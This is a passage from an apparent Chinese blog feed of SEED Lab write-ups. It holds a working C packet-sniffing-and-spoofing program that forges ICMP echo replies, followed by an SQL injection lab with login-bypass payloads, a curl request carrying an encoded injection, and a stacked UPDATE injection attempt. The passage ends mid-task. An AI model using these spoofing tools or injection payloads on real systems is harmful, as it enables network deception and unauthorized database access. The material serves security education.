class="number">0</span>;</span><br><span class="line">   icmp-&gt;icmp_chksum = in_cksum((<span class="type">unsigned</span> <span class="type">short</span> *)icmp,</span><br><span class="line">                                 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> icmpheader));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 2: Fill in the IP header.</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *) buffer;</span><br><span class="line">   ip-&gt;iph_ver = <span class="number">4</span>;</span><br><span class="line">   ip-&gt;iph_ihl = <span class="number">5</span>;</span><br><span class="line">   ip-&gt;iph_ttl = <span class="number">20</span>;</span><br><span class="line">   ip-&gt;iph_sourceip.s_addr = inet_addr(<span class="string">&quot;10.9.0.5&quot;</span>);</span><br><span class="line">   ip-&gt;iph_destip.s_addr = inet_addr(<span class="string">&quot;8.8.8.8&quot;</span>);</span><br><span class="line">   ip-&gt;iph_protocol = IPPROTO_ICMP;</span><br><span class="line">   ip-&gt;iph_len = htons(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader) +</span><br><span class="line">                       <span class="keyword">sizeof</span>(<span class="keyword">struct</span> icmpheader));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 3: Finally, send the spoofed packet</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">   send_raw_ip_packet (ip);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用gcc -o task22B task22B.c spoof.c checksum.c -lpcap 进行编译， sudo .&#x2F;task22B运行，查看后台的wireshark,如下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700487218329-07997d80-5fe6-4e97-b87f-56651d7e7438.png#averageHue=%23262626&clientId=uc1ecd9fc-35b2-4&from=paste&height=81&id=u178b20e6&originHeight=128&originWidth=823&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=22993&status=done&style=none&taskId=uc7395484-42a1-4dc5-af76-0c8e637a2a8&title=&width=522.539706269811" alt="image.png"></p><p>可以看到我们发送的源IP为10.0.2.5, 目的IP为8.8.8.8的ICMP包<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700487434034-b1ddf585-1ad6-4cd1-a64e-bed3dec4a17c.png#averageHue=%23566f6f&clientId=uc1ecd9fc-35b2-4&from=paste&height=288&id=ucf61cddb&originHeight=454&originWidth=962&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=134976&status=done&style=none&taskId=uddf212ce-1ea1-4701-9b9d-79800fcb096&title=&width=610.7936785316624" alt="image.png"><br>:::info<br><strong>Q4: 是否可以将IP数据包长度字段设置为任意值，而不管实际的数据包有多大？</strong><br>:::<br>**A4: **不能将IP数据包长度字段设置为任意值而不考虑实际的数据包大小。IP数据包长度字段指示整个IP数据包的长度，包括IP报头和数据部分的总大小。IP协议要求IP数据包长度字段必须与实际数据包的大小一致。如果将IP数据包长度字段设置为错误的值，接收方将无法正确解析数据包，导致数据包被丢弃或引发错误。</p><p>:::info<br><strong>Q5: 使用原始套接字编程，是否需要计算IP报头的校验和？</strong><br>:::<br>**A5: **在使用原始套接字编程发送自定义的IP数据包时，通常需要计算并设置IP报头的校验和。IP报头的校验和是一种 用于验证IP数据包完整性的校验机制。它通过对IP报头字段进行计算，生成一个校验和值，并将该值填充到IP报头的校验和字段中。接收方在接收到数据包时会重新计算校验和，并与接收到的校验和字段进行比较，以检测数据包是否在传输过程中发生了损坏或篡改。</p><p>:::info<br><strong>Q6: 为什么您需要根权限来运行使用原始套接字的程序？如果没有根特权，程序在哪里失败</strong><br>:::<br><strong>A6:</strong> Linux系统中，原始套接字访问是受限的，并且通常需要根权限（也称为超级用户权限）才能够访问。这是为了确保系统的安全性和防止滥用。原始套接字允许程序直接访问网络层数据包，包括IP头部和传输层协议头部。这种低级别的网络访问可以用于实现各种网络工具和协议，例如网络扫描器、数据包嗅探器和网络安全工具等。如果没有根权限，程序在尝试使用原始套接字时通常会失败。这是因为操作系统对访问原始套接字进行了限制，只有具有足够权限的用户才能够执行这些操作。如果没有特权，操作系统会拒绝相关系统调用，返回权限错误或类似的错误消息。</p><p><a name="CeARc"></a></p><h3 id="4-3-Task-2-3-Sniff-and-then-Spoof"><a href="#4-3-Task-2-3-Sniff-and-then-Spoof" class="headerlink" title="4.3 Task 2.3: Sniff and then Spoof"></a><strong>4.3 Task 2.3: Sniff and then Spoof</strong></h3><blockquote><p>在此任务中，您将结合嗅探和欺骗技术来实现以下嗅探和欺骗程序。你需要在同一局域网上的两台机器。从机器A，你ping一个IP X。这将生成一个ICMP回波请求包。如果X是活动的，ping程序将收到一个回声响应，并打印出响应。你的嗅探和欺骗程序运行在攻击者的机器上，它通过数据包嗅探来监视局域网。当它看到ICMP echo请求时，无论目标IP地址是什么，您的程序应该立即使用包欺骗技术发送回声回复。因此，无论机器X是否活动，ping程序都将始终收到一个回复，表明X是活动的。您需要用C语言编写这样一个程序，并在报告中包含屏幕截图，以显示您的程序是工作的。请在您的报告中附上代码（有足够的内容）。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myheader.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">got_packet</span><span class="params">(u_char *args, <span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *header,</span></span><br><span class="line"><span class="params">                              <span class="type">const</span> u_char *packet)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethheader</span> *<span class="title">eth</span> =</span> (<span class="keyword">struct</span> ethheader *)packet;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ntohs(eth-&gt;ether_type) == <span class="number">0x0800</span>) &#123; <span class="comment">// 0x0800 is IP type</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> * <span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *)</span><br><span class="line">                           (packet + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ethheader));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;From: %s &quot;</span>, inet_ntoa(ip-&gt;iph_sourceip));   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;To: %s &quot;</span>, inet_ntoa(ip-&gt;iph_destip));</span><br><span class="line">    <span class="keyword">if</span> (ip-&gt;iph_protocol == IPPROTO_ICMP)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;protocal: ICMP\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;protocal: Others\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> *<span class="title">icmp_pkt</span> =</span> (<span class="keyword">struct</span> icmpheader *)(packet + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ethheader)</span><br><span class="line">                                                               + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ip-&gt;iph_protocol == IPPROTO_ICMP) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">1500</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">             Step 1: Fill in the ICMP header.</span></span><br><span class="line"><span class="comment">            ********************************************************/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> *<span class="title">icmp</span> =</span> (<span class="keyword">struct</span> icmpheader *)</span><br><span class="line">                                    (buffer + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader));</span><br><span class="line">        icmp-&gt;icmp_type = <span class="number">0</span>; <span class="comment">//ICMP Type: 8 is request, 0 is reply.</span></span><br><span class="line">        icmp-&gt;icmp_code = <span class="number">0</span>;</span><br><span class="line">        icmp-&gt;icmp_id   = icmp_pkt-&gt;icmp_id;</span><br><span class="line">        icmp-&gt;icmp_seq  = icmp_pkt-&gt;icmp_seq;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;icmp id: %d, seq: %d\n&quot;</span>, ntohs(icmp_pkt-&gt;icmp_id), ntohs(icmp_pkt-&gt;icmp_seq));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate the checksum for integrity</span></span><br><span class="line">        icmp-&gt;icmp_chksum = <span class="number">0</span>;</span><br><span class="line">        icmp-&gt;icmp_chksum = in_cksum((<span class="type">unsigned</span> <span class="type">short</span> *)icmp,</span><br><span class="line">                                        <span class="keyword">sizeof</span>(<span class="keyword">struct</span> icmpheader));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">             Step 2: Fill in the IP header.</span></span><br><span class="line"><span class="comment">            ********************************************************/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ipp</span> =</span> (<span class="keyword">struct</span> ipheader *) buffer;</span><br><span class="line">        ipp-&gt;iph_ver = <span class="number">4</span>;</span><br><span class="line">        ipp-&gt;iph_ihl = <span class="number">5</span>;</span><br><span class="line">        ipp-&gt;iph_ttl = <span class="number">64</span>;</span><br><span class="line">        ipp-&gt;iph_sourceip.s_addr = ip-&gt;iph_destip.s_addr;</span><br><span class="line">        ipp-&gt;iph_destip.s_addr = ip-&gt;iph_sourceip.s_addr;</span><br><span class="line">        ipp-&gt;iph_protocol = IPPROTO_ICMP;</span><br><span class="line">        ipp-&gt;iph_len = htons(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader) +</span><br><span class="line">                            <span class="keyword">sizeof</span>(<span class="keyword">struct</span> icmpheader));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send tt source :%s\n&quot;</span>, inet_ntoa(ipp-&gt;iph_sourceip));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send tt dest: %s\n&quot;</span>, inet_ntoa(ipp-&gt;iph_destip));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">             Step 3: Finally, send the spoofed packet</span></span><br><span class="line"><span class="comment">            ********************************************************/</span></span><br><span class="line">        <span class="comment">// icmp_pkt-&gt;icmp_type = 0;</span></span><br><span class="line">        <span class="comment">// icmp_pkt-&gt;icmp_code = 0;</span></span><br><span class="line">        <span class="comment">// icmp-&gt;icmp_chksum = 0;</span></span><br><span class="line">        <span class="comment">// icmp-&gt;icmp_chksum = in_cksum((unsigned short *)icmp,</span></span><br><span class="line">        <span class="comment">//                                 sizeof(struct icmpheader));</span></span><br><span class="line">        send_raw_ip_packet (ipp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pcap_t</span> *handle;</span><br><span class="line">  <span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">char</span> filter_exp[] = <span class="string">&quot;icmp[icmptype]==icmp-echo&quot;</span>;</span><br><span class="line">  bpf_u_int32 net;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 1: Open live pcap session on NIC with name enp0s3</span></span><br><span class="line">  handle = pcap_open_live(<span class="string">&quot;enp0s3&quot;</span>, BUFSIZ, <span class="number">1</span>, <span class="number">1000</span>, errbuf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;listening on network card, ret: %p...\n&quot;</span>, handle);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 2: Compile filter_exp into BPF psuedo-code</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;try to compile filter...\n&quot;</span>);</span><br><span class="line">  pcap_compile(handle, &amp;fp, filter_exp, <span class="number">0</span>, net);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;try to set filter...\n&quot;</span>);</span><br><span class="line">  pcap_setfilter(handle, &amp;fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 3: Capture packets</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;start to sniff...\n&quot;</span>);</span><br><span class="line">  pcap_loop(handle, <span class="number">-1</span>, got_packet, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  pcap_close(handle);   <span class="comment">//Close the handle</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gcc -o task23 task23.c checksum.c spoof.c -lpcap编译程序，sudo .&#x2F;task23运行<br />关闭网络，使用另一台机器ping 1.1.1.1，此机器运行上面的程序，结果如下：<br><a name="zaLDF"></a></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700488293059-f1d92323-2c58-4242-b656-e222d9eebbc0.png#averageHue=%232c2c2c&clientId=ub5272dc8-70b2-4&from=paste&height=227&id=u19b2baa1&originHeight=357&originWidth=805&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=56021&status=done&style=none&taskId=u1661f04d-19b0-4269-82f2-16e4f391d1e&title=&width=511.1111343222331" alt="image.png"></h3><p>程序输出如下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700488341385-889eeb7a-123d-4fda-ab32-ab7658e29481.png#averageHue=%23262626&clientId=ub5272dc8-70b2-4&from=paste&height=432&id=u8356152d&originHeight=681&originWidth=801&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=80108&status=done&style=none&taskId=ufe1ffdf1-cdeb-483f-81f9-8bd9afbc8c2&title=&width=508.5714516672158" alt="image.png"><br />要注意的是，程序中使用的inet_ntoa函数以字符串形式返回ip地址，该字符串存在函数内部的静态区域，下一次调用会刷新，之前的结果将会失效。</p>]]></content>
      
      
      <categories>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab 嗅探攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEEDLAB：SQL注入攻击实验</title>
      <link href="/post/50860de4.html"/>
      <url>/post/50860de4.html</url>
      
        <content type="html"><![CDATA[<p><a name="cIZ0i"></a></p><h1 id="一、-实验目的"><a href="#一、-实验目的" class="headerlink" title="一、    实验目的"></a>一、    实验目的</h1><p><a name="Juc2u"></a></p><h2 id="1-overview"><a href="#1-overview" class="headerlink" title="1 overview"></a>1 overview</h2><p>SQL注入是一种代码注入技术，它利用web应用程序和数据库服务器之间接口中的漏洞。当用户的输入在发送到后端数据库服务器之前未在web应用程序中正确检查时，就会出现此漏洞。许多web应用程序从用户处获取输入，然后使用这些输入构造SQL查询，这样web应用程序就可以从数据库中获取信息。Web应用程序还使用SQL查询在数据库中存储信息。这些是web应用程序开发中的常见做法。如果未仔细构造SQL查询，则可能会出现SQL注入漏洞。SQL注入攻击是对web应用程序最常见的攻击之一。</p><p>在本实验室中，我们创建了一个易受SQL注入攻击的web应用程序。我们的web应用程序包含许多web开发人员所犯的常见错误。学生的目标是找到利用SQL注入漏洞的方法，演示攻击可能造成的损害，并掌握有助于抵御此类攻击的技术。<br><a name="vg0k9"></a></p><h1 id="二、-实验步骤及结果"><a href="#二、-实验步骤及结果" class="headerlink" title="二、    实验步骤及结果"></a>二、    实验步骤及结果</h1><p><a name="STc8I"></a></p><h2 id="2-Lab-Environment"><a href="#2-Lab-Environment" class="headerlink" title="2 Lab Environment"></a><strong>2 Lab Environment</strong></h2><p>由于实验环境已经在VM SeedUbuntu20.04上面配置完成，因此，直接在Firefox中访问即可。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699271123843-7687b0c9-6803-4e8c-bf7d-92fe150d5e21.png#averageHue=%23f2fbe3&clientId=u5bc2f54f-cc4f-4&from=paste&height=307&id=ufcce9592&originHeight=644&originWidth=1216&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=53794&status=done&style=none&taskId=u3f19517a-e874-4735-a807-4bee5d0d094&title=&width=579.4603271484375" alt="image.png"></p><p><a name="vTOH6"></a></p><h2 id="3-Lab-Tasks"><a href="#3-Lab-Tasks" class="headerlink" title="3 Lab Tasks"></a><strong>3 Lab Tasks</strong></h2><p><a name="gGXYT"></a></p><h3 id="3-1-Task-1-Get-Familiar-with-SQL-Statements"><a href="#3-1-Task-1-Get-Familiar-with-SQL-Statements" class="headerlink" title="3.1: Task 1: Get Familiar with SQL Statements"></a>3.1: Task 1: Get Familiar with SQL Statements</h3><p>启动 docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dcbuild</span><br><span class="line">dcup</span><br></pre></td></tr></table></figure><p>然后进入 mysql 程序，在实验文件夹内启动数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dockps</span><br><span class="line">docksh **</span><br><span class="line">mysql -u root -pdees</span><br></pre></td></tr></table></figure><p>如图：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699272708701-ad4b9b2b-92e6-4fad-9306-e79916fe3959.png#averageHue=%23262524&clientId=u5bc2f54f-cc4f-4&from=paste&height=311&id=u68ac30b8&originHeight=490&originWidth=842&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=49842&status=done&style=none&taskId=u0ff91010-a7c9-451a-a84f-7424469c36f&title=&width=534.6031988811432" alt="image.png"></p><p>进入数据库sqllab_users，查看其所有表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use sqllab_users;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure><p>如图：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699273446438-10196772-1080-434c-b435-131bc5e7ed91.png#averageHue=%23232222&clientId=u5bc2f54f-cc4f-4&from=paste&height=241&id=u47815b32&originHeight=379&originWidth=916&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=26032&status=done&style=none&taskId=u69a599a5-28d2-484c-9dc8-e9a9a393789&title=&width=581.5873279989634" alt="image.png"></p><p><a name="S7od5"></a></p><h3 id="3-2-Task-2-SQL-Injection-Attack-on-SELECT-Statement"><a href="#3-2-Task-2-SQL-Injection-Attack-on-SELECT-Statement" class="headerlink" title="3.2 Task 2: SQL Injection Attack on SELECT Statement"></a>3.2 Task 2: SQL Injection Attack on SELECT Statement</h3><p><a name="a03Vx"></a></p><h4 id="3-2-1-Task-2-1-SQL-Injection-Attack-from-webpage"><a href="#3-2-1-Task-2-1-SQL-Injection-Attack-from-webpage" class="headerlink" title="3.2.1 Task 2.1: SQL Injection Attack from webpage"></a>3.2.1 Task 2.1: SQL Injection Attack from webpage</h4><blockquote><p>您的任务是以管理员身份登录到web应用程序，这样您就可以看到所有员工的信息。我们假设您知道管理员的帐户名，即admin，但您不知道密码。您需要决定在用户名和密码中输入什么字段才能成功地进行攻击。</p></blockquote><p>打开 seed-server.com<br />观察 unsafe_home.php，看到里面有如下判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT id, name, eid, salary, birth, ssn, address, email,</span></span><br><span class="line"><span class="string">        nickname, Password</span></span><br><span class="line"><span class="string">        FROM credential</span></span><br><span class="line"><span class="string">        WHERE name= ’<span class="variable">$input_uname</span>’ and Password=’<span class="variable">$hashed_pwd</span>’&quot;</span>;</span><br></pre></td></tr></table></figure><p>此处的原理是在php文件的检索数据库内容的时候没有对数据和代码相分离，因此，在查询name 的时候，输入的Username可以加入’使得引号闭合，加入#使得注释掉后面的内容，因此验证用户身份的过程通过SQL注入就绕过了对口令的验证，只验证用户名是否匹配，即可通过验证。<br />使用(密码随意写)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;;#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699278966794-d8fe29fa-c59d-4c79-ac5d-4554809f63bb.png#averageHue=%23f3fce4&clientId=ucd935773-59d7-4&from=paste&height=390&id=u63f71fad&originHeight=615&originWidth=1200&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=36979&status=done&style=none&taskId=uae48fcb3-c940-4220-ac61-6450919cae5&title=&width=761.9047965051922" alt="image.png"><br />攻击结果如图：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699278983365-3f897c12-4686-470e-832e-b76bd5138f58.png#averageHue=%23e1f1d5&clientId=ucd935773-59d7-4&from=paste&height=421&id=ufb6a456b&originHeight=764&originWidth=1192&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=78262&status=done&style=none&taskId=ua4085bc1-55f8-4d39-b718-38a07f164d0&title=&width=657.4603271484375" alt="image.png"><br><a name="XPw1R"></a></p><h4 id="3-2-2-Task-2-2-SQL-Injection-Attack-from-command-line"><a href="#3-2-2-Task-2-2-SQL-Injection-Attack-from-command-line" class="headerlink" title="3.2.2 Task 2.2: SQL Injection Attack from command line"></a>3.2.2 Task 2.2: SQL Injection Attack from command line</h4><blockquote><p>你的任务是重复task 2.1，但你需要在不使用网页的情况下完成它。您可以使用命令行工具，例如curl，它可以发送HTTP请求。值得一提的是，如果你想在HTTP请求中包含多个参数，你需要将URL和参数放在一对单引号之间;否则，用于分隔参数的特殊字符(如&amp;)将被shell程序解释，从而改变命令的含义。</p></blockquote><p>使用命令行的curl命令发送HTTP Request，其中与Task2.1类似，构造username&#x3D;admin’#，Password&#x3D;123。<br />需要注意的是因为此处直接发送的是HTTP Request，即需要对特殊字符进行URL编码，此处用到的特殊字符有三个：’# &amp;<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699279076819-7f3341b6-b2cf-41ff-b7b9-fa9034440ec4.png#averageHue=%23cabca9&clientId=ucd935773-59d7-4&from=paste&id=u1c3906fb&originHeight=113&originWidth=299&originalType=url&ratio=1.5749999284744263&rotation=0&showTitle=false&status=done&style=none&taskId=uea296339-850b-4be2-b925-bbd427b9088&title="></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;www.seed-server.com/unsafe_home.php?username=admin%27%3B%23&amp;Password=123&#x27;</span></span><br></pre></td></tr></table></figure><p>可以看到，成功发送了HTTP Request请求，并获得了web服务器的相应的html表单。查看表单中的信息，找到相关的职员信息表格。如下图所示，分别包括了相应的colum，以及表单中的相应内容：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699279316172-e4dee0de-aa13-49d0-9bd4-de782edd1c52.png#averageHue=%232a2927&clientId=ucd935773-59d7-4&from=paste&height=583&id=u3fc7f4c1&originHeight=1056&originWidth=1094&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=149539&status=done&style=none&taskId=ue120baa1-97c9-4240-9857-ad9c19fd7a7&title=&width=604.4603271484375" alt="image.png"><br><a name="nCrJB"></a></p><h4 id="3-2-3-Task-2-3-Append-a-new-SQL-statement"><a href="#3-2-3-Task-2-3-Append-a-new-SQL-statement" class="headerlink" title="3.2.3 Task 2.3: Append a new SQL statement"></a>3.2.3 Task 2.3: Append a new SQL statement</h4><blockquote><p>在上述两种攻击中，我们只能从数据库中窃取信息;如果我们可以在登录页面中使用相同的漏洞来修改数据库就更好了。一种想法是使用SQL注入攻击将一条SQL语句变成两条，而第二条SQL语句则是更新或删除语句。在SQL语句中，分号(;)用来分隔两条SQL语句。请描述如何使用登录页面让服务器运行两个SQL语句。尝试从数据库中删除一条记录，并描述您的观察结果。</p></blockquote><p>此处其实就是堆叠注入，考虑的是在注入的时候，考虑连续注入两条命令，使用；为隔离。使用update命令来更新数据表。注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;; update credential set name=A where ID=1;#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699337500058-e0ec68ea-0a6b-4f57-a9d7-b5d05f408cce.png#averageHue=%23f3fce4&clientId=u7169dd6b-6a5c-4&from=paste&height=360&id=u1aadb61d&originHeight=567&originWidth=1250&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=42814&status=done&style=none&taskId=ua8990495-3de0-4f77-8b77-2d9391549fe&title=&width=793.6508296929086" alt="image.png"></p><p>可以看到注入不成功：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699337526244-1b5a5bc7-7398-4f73-ba84-915458c928e2.png#averageHue=%23c0e2bc&clientId=u7169dd6b-6a5c-4&from=paste&height=119&id=u7f52e562&originHeight=188&originWidth=1249&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=34724&status=done&style=none&taskId=u57c6ca6c-f992-4e69-a7e3-f4085dbec2c&title=&width=793.0159090291542" alt="image.png"><br />原因是,PHP 中 mysqli 扩展的 query（）函数不允许在数据 库服务器中运行多条语句。 这是 MySQL 中的一种特殊的保护机制。<br /><br><a name="hFfE0"></a></p><h3 id="3-3-Task-3-SQL-Injection-Attack-on-UPDATE-Statement"><a href="#3-3-Task-3-SQL-Injection-Attack-on-UPDATE-Statement" class="headerlink" title="3.3 Task 3: SQL Injection Attack on UPDATE Statement"></a>3.3 Task 3: SQL Injection Attack on UPDATE Statement</h3><p><a name="hVwsQ"></a></p><h4 id="3-3-1-Task-3-1-Modify-your-own-salary"><a href="#3-3-1-Task-3-1-Modify-your-own-salary" class="headerlink" title="3.3.1 Task 3.1: Modify your own salary"></a>3.3.1 Task 3.1: Modify your own salary</h4><blockquote><p>如Edit中所示个人资料页面，员工只能更新自己的昵称、电子邮件、地址、电话号码和密码;他们无权改变自己的薪水。只有管理员才可以修改工资。如果你是一个恶意的员工(比如Alice)，你在这个任务中的目标是通过编辑个人资料页面来增加你自己的薪水。我们假设您知道，工资存储在一个名为“工资”的列中。</p></blockquote><p>首先利用 SQL 注入漏洞登录 Alice 账户：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 